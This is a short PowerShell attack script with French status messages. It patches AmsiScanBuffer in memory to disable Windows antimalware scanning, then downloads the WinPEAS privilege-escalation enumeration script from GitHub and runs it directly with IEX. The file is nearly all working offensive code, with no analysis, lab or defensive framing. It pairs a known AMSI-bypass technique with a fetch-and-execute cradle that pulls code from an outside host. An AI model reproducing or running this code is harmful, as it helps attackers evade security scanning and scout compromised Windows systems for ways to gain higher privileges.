$amsiBypass = @"
using System;
using System.Runtime.InteropServices;
public class Bypass {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    public static void Disable() {
        IntPtr hModule = LoadLibrary("amsi.dll");
        IntPtr addr = GetProcAddress(hModule, "AmsiScanBuffer");
        uint oldProtect;
        VirtualProtect(addr, (UIntPtr)5, 0x40, out oldProtect);
        Marshal.Copy(new byte[] { 0x31, 0xC0, 0xC3 }, 0, addr, 3);
    }
}
"@
Add-Type -TypeDefinition $amsiBypass
[Bypass]::Disable()

Write-Output "[*] Démarrage de l'analyse WinPEAS..."
Write-Output "[*] Téléchargement et exécution de WinPEAS depuis GitHub..."
Write-Output "==========================================="

try {
    # Télécharger et exécuter WinPEAS directement en mémoire
    IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1')
    
    Write-Output "==========================================="
    Write-Output "[+] Analyse WinPEAS terminée"
} catch {
    Write-Output "[!] Erreur lors de l'exécution de WinPEAS:"
    Write-Output $_.Exception.Message
    Write-Output $_.Exception.StackTrace
}